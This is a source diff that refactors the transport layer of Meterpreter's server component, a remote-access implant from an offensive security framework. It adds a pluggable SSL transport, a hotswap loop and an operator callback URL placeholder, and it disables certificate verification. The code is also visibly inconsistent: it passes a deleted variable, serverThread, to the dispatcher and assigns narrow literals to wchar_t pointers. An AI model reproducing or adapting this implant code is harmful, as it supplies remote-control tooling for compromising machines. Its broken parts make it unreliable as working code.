@@ -4,26 +4,23 @@
 #include "metsrv.h"
 #include "../../common/common.h"
 
-char *global_meterpreter_transport =
+wchar_t *global_meterpreter_transport =
 	"METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char *global_meterpreter_url =
-	"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
-char *global_meterpreter_ua =
+wchar_t *global_meterpreter_url =
+	"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
+wchar_t *global_meterpreter_ua =
 	"METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char *global_meterpreter_proxy =
+wchar_t *global_meterpreter_proxy =
 	"METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char *global_meterpreter_proxy_username =
+wchar_t *global_meterpreter_proxy_username =
 	"METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char *global_meterpreter_proxy_password =
+wchar_t *global_meterpreter_proxy_password =
 	"METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
 int global_expiration_timeout = 0xb64be661;
 int global_comm_timeout = 0xaf79257f;
 
 #define SetHandleInformation(a, b, c)
 const unsigned int hAppInstance = 0x504b5320;	// 'PKS '
-
-/*! @brief This thread is the main server thread. */
-static THREAD *serverThread = NULL;
 
 /*! @brief An array of locks for use by OpenSSL. */
 static LOCK **ssl_locks = NULL;
@@ -89,27 +86,26 @@ static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value *l, const cha
  */
 static void server_socket_flush(Remote * remote)
 {
+	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 	fd_set fdread;
 	DWORD ret;
-	SOCKET fd;
 	char buff[4096];
 	lock_acquire(remote->lock);
-	fd = remote_get_fd(remote);
 
 	while (1) {
 		struct timeval tv;
 		LONG data;
 		FD_ZERO(&fdread);
-		FD_SET(fd, &fdread);
+		FD_SET(ctx->fd, &fdread);
 
 		// Wait for up to one second for any errant socket data to appear
 		tv.tv_sec = 1;
 		tv.tv_usec = 0;
-		data = select((int)fd + 1, &fdread, NULL, NULL, &tv);
+		data = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
 		if (data == 0)
 			break;
 
-		ret = recv(fd, buff, sizeof(buff), 0);
+		ret = recv(ctx->fd, buff, sizeof(buff), 0);
 		dprintf("[SERVER] Flushed %d bytes from the buffer", ret);
 
 		// The socket closed while we waited
@@ -125,17 +121,17 @@ static void server_socket_flush(Remote * remote)
  */
 static LONG server_socket_poll(Remote * remote, long timeout)
 {
+	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 	struct timeval tv;
 	LONG result;
 	fd_set fdread;
-	SOCKET fd;
+
 	lock_acquire(remote->lock);
-	fd = remote_get_fd(remote);
 	FD_ZERO(&fdread);
-	FD_SET(fd, &fdread);
+	FD_SET(ctx->fd, &fdread);
 	tv.tv_sec = 0;
 	tv.tv_usec = timeout;
-	result = select((int)fd + 1, &fdread, NULL, NULL, &tv);
+	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
 
 	if (result == -1 &&
 	    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))
@@ -184,13 +180,17 @@ static int server_initialize_ssl(Remote * remote)
  */
 void server_destroy_ssl(Remote * remote)
 {
+	TcpTransportContext* ctx = NULL;
 	int i;
 
 	if (remote) {
 		dprintf("[SERVER] Destroying SSL");
 		lock_acquire(remote->lock);
-		SSL_free(remote->ssl);
-		SSL_CTX_free(remote->ctx);
+		if (remote->transport && remote->transport->ctx) {
+			ctx = (TcpTransportContext*)remote->transport->ctx;
+			SSL_free(ctx->ssl);
+			SSL_CTX_free(ctx->ctx);
+		}
 		CRYPTO_set_locking_callback(NULL);
 		CRYPTO_set_id_callback(NULL);
 		CRYPTO_set_dynlock_create_callback(NULL);
@@ -210,27 +210,26 @@ void server_destroy_ssl(Remote * remote)
  */
 static BOOL server_negotiate_ssl(Remote * remote)
 {
+	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 	BOOL success = TRUE;
-	SOCKET fd = 0;
 	DWORD ret = 0;
 	DWORD res = 0;
 	lock_acquire(remote->lock);
 
-	fd = remote_get_fd(remote);
-	remote->meth = TLSv1_client_method();
-	remote->ctx = SSL_CTX_new(remote->meth);
-	SSL_CTX_set_mode(remote->ctx, SSL_MODE_AUTO_RETRY);
-	remote->ssl = SSL_new(remote->ctx);
-	SSL_set_verify(remote->ssl, SSL_VERIFY_NONE, NULL);
-	if (SSL_set_fd(remote->ssl, (int)remote->fd) == 0) {
+	ctx->meth = TLSv1_client_method();
+	ctx->ctx = SSL_CTX_new(ctx->meth);
+	SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);
+	ctx->ssl = SSL_new(ctx->ctx);
+	SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);
+	if (SSL_set_fd(ctx->ssl, ctx->fd) == 0) {
 		dprintf("[SERVER] set fd failed");
 		success = FALSE;
 		goto out;
 	}
 
 	do {
-		if ((ret = SSL_connect(remote->ssl)) != 1) {
-			res = SSL_get_error(remote->ssl, ret);
+		if ((ret = SSL_connect(ctx->ssl)) != 1) {
+			res = SSL_get_error(ctx->ssl, ret);
 			dprintf("[SERVER] connect failed %d\n", res);
 			if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE) {
 
@@ -246,9 +245,9 @@ static BOOL server_negotiate_ssl(Remote * remote)
 		goto out;
 
 	dprintf("[SERVER] Sending a HTTP GET request to the remote side...");
-	if ((ret = SSL_write(remote->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0) {
+	if ((ret = SSL_write(ctx->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0) {
 		dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret,
-			SSL_get_error(remote->ssl, ret));
+			SSL_get_error(ctx->ssl, ret));
 	}
 
 out:
@@ -264,7 +263,7 @@ out:
  * @param remote Pointer to the remote endpoint for this server connection.
  * @returns Indication of success or failure.
  */
-static DWORD server_dispatch(Remote * remote)
+static DWORD server_dispatch(Remote * remote, THREAD* dispatchThread)
 {
 	BOOL running = TRUE;
 	LONG result = ERROR_SUCCESS;
@@ -278,13 +277,13 @@ static DWORD server_dispatch(Remote * remote)
 		return result;
 	}
 	while (running) {
-		if (event_poll(serverThread->sigterm, 0)) {
+		if (event_poll(dispatchThread->sigterm, 0)) {
 			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
 			break;
 		}
 		result = server_socket_poll(remote, 100);
 		if (result > 0) {
-			result = packet_receive(remote, &packet);
+			result = remote->transport->packet_receive(remote, &packet);
 			if (result != ERROR_SUCCESS) {
 				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
 				break;
@@ -309,11 +308,77 @@ static DWORD server_dispatch(Remote * remote)
 	return result;
 }
 
+BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
+{
+	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+
+	// assume that we have been given a valid socket given that there's no stageless information
+	ctx->fd = socket;
+
+	// Do not allow the file descriptor to be inherited by child processes
+	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
+
+	dprintf("[SERVER] Flushing the socket handle...");
+	server_socket_flush(remote);
+
+	dprintf("[SERVER] Initializing SSL...");
+	if (!server_initialize_ssl(remote))
+	{
+		return FALSE;
+	}
+
+	dprintf("[SERVER] Negotiating SSL...");
+	if (!server_negotiate_ssl(remote))
+	{
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+BOOL transport_create(Remote* remote)
+{
+	wchar_t* transport = remote->pNextTransportType;
+	wchar_t* url = remote->pNextTransportUrl;
+
+	dprintf("[TRANSPORT] Type = %S", transport);
+	dprintf("[TRANSPORT] URL = %S", url);
+
+	remote->transport = (Transport*)malloc(sizeof(Transport));
+	memset(remote->transport, 0, sizeof(Transport));
+
+	remote->transport->url = url;
+
+	if (wcscmp(transport, L"TRANSPORT_SSL") == 0)
+	{
+		TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
+
+		memset(ctx, 0, sizeof(TcpTransportContext));
+
+		remote->transport->packet_receive = packet_receive_via_ssl;
+		remote->transport->packet_transmit = packet_transmit_via_ssl;
+		remote->transport->transport_init = configure_tcp_connection;
+		remote->transport->transport_deinit = server_destroy_ssl;
+		remote->transport->server_dispatch = server_dispatch;
+		remote->transport->get_socket = tcp_transport_get_socket;
+		remote->transport->ctx = ctx;
+		remote->transport->type = METERPRETER_TRANSPORT_SSL;
+	}
+	else // TODO: add more transports over time
+	{
+		dprintf("[SETUP] Not supported");
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
 /*
  * Setup and run the server. This is called from Init via the loader.
  */
 DWORD server_setup(SOCKET fd)
 {
+	THREAD * dispatchThread = NULL;
 	Remote *remote = NULL;
 	char cStationName[256] = { 0 };
 	char cDesktopName[256] = { 0 };
@@ -327,79 +392,58 @@ DWORD server_setup(SOCKET fd)
 	dprintf("[SERVER] module loaded at 0x%08X", hAppInstance);
 
 	// Open a THREAD item for the servers main thread, we use this to manage migration later.
-	serverThread = thread_open();
+	dispatchThread = thread_open();
 	dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X",
-		serverThread->handle, serverThread->id, serverThread->sigterm);
-	if (!(remote = remote_allocate(fd))) {
+		dispatchThread->handle, dispatchThread->id, dispatchThread->sigterm);
+
+	if (!(remote = remote_allocate())) {
 		SetLastError(ERROR_NOT_ENOUGH_MEMORY);
 		goto out;
 	}
 
-	remote->url = global_meterpreter_url;
-	if (strcmp(global_meterpreter_transport + 12, "TRANSPORT_SSL") == 0) {
-		remote->transport = METERPRETER_TRANSPORT_SSL;
-		dprintf("[SERVER] Using SSL transport...");
-
-	} else if (strcmp(global_meterpreter_transport + 12, "TRANSPORT_HTTPS") == 0) {
-		remote->transport = METERPRETER_TRANSPORT_HTTPS;
-		dprintf("[SERVER] Using HTTPS transport...");
-
-	} else if (strcmp(global_meterpreter_transport + 12, "TRANSPORT_HTTP") == 0) {
-		remote->transport = METERPRETER_TRANSPORT_HTTP;
-		dprintf("[SERVER] Using HTTP transport...");
-	}
-
-	// Do not allow the file descriptor to be inherited by child processes
-	SetHandleInformation((HANDLE) fd, HANDLE_FLAG_INHERIT, 0);
-	dprintf("[SERVER] Initializing tokens...");
-
 	// Store our thread handle
-	remote->hServerThread = serverThread->handle;
+	remote->hServerThread = dispatchThread->handle;
 
-	// Process our default SSL-over-TCP transport
-	if (remote->transport == METERPRETER_TRANSPORT_SSL) {
-		dprintf("[SERVER] Flushing the socket handle...");
-		server_socket_flush(remote);
+	dprintf("[SERVER] Registering dispatch routines...");
+	register_dispatch_routines();
 
-		dprintf("[SERVER] Initializing SSL...");
-		if (server_initialize_ssl(remote))
-			goto out;
+	// allocate the "next transport" information
+	remote->pNextTransportType = _wcsdup(global_meterpreter_transport + 12);
+	remote->pNextTransportUrl = _wcsdup(global_meterpreter_url);
 
-		dprintf("[SERVER] Negotiating SSL...");
-		if (!server_negotiate_ssl(remote))
-			goto out;
+	while (remote->pNextTransportType && remote->pNextTransportUrl) {
+		dprintf("[SERVER] creating transport");
+		if (!transport_create(remote)) {
+			break;
+		}
 
-		dprintf("[SERVER] Registering dispatch routines...");
-		register_dispatch_routines();
+		dprintf("[SERVER] initialising transport 0x%p", remote->transport->transport_init);
+		if (remote->transport->transport_init && !remote->transport->transport_init(remote, fd)) {
+			break;
+		}
 
-		dprintf("[SERVER] Entering the main server dispatch loop for transport %d...",
-			remote->transport);
-		server_dispatch(remote);
+		// clear out the transport details, they'll be added elsewhere if the
+		// transport needs to be hotswapped
+		free(remote->pNextTransportType);
+		free(remote->pNextTransportUrl);
+		remote->pNextTransportType = NULL;
+		remote->pNextTransportUrl = NULL;
 
-		dprintf("[SERVER] Deregistering dispatch routines...");
-		deregister_dispatch_routines(remote);
+		dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
+		remote->transport->server_dispatch(remote, serverThread);
+
+		if (remote->transport->transport_deinit) {
+			remote->transport->transport_deinit(remote);
+		}
+
+		free(remote->transport);
+		remote->transport = NULL;
 	}
 
-out:
-	if (remote->transport == METERPRETER_TRANSPORT_HTTP
-		|| remote->transport == METERPRETER_TRANSPORT_HTTPS) {
-		dprintf("[SERVER] Registering dispatch routines...");
-		register_dispatch_routines();
-		dprintf("[SERVER] Entering the main server dispatch loop for transport %d...",
-			remote->transport);
+	dprintf("[SERVER] Deregistering dispatch routines...");
+	deregister_dispatch_routines(remote);
 
-		// XXX: Handle non-windows HTTP transport
-		dprintf("[SERVER] Deregistering dispatch routines...");
-		deregister_dispatch_routines(remote);
-	}
-
-	if (remote->transport == METERPRETER_TRANSPORT_SSL) {
-		dprintf("[SERVER] Closing down SSL...");
-		server_destroy_ssl(remote);
-	}
-
-	if (remote)
-		remote_deallocate(remote);
+	remote_deallocate(remote);
 
 	dprintf("[SERVER] Finished.");
 	return res;
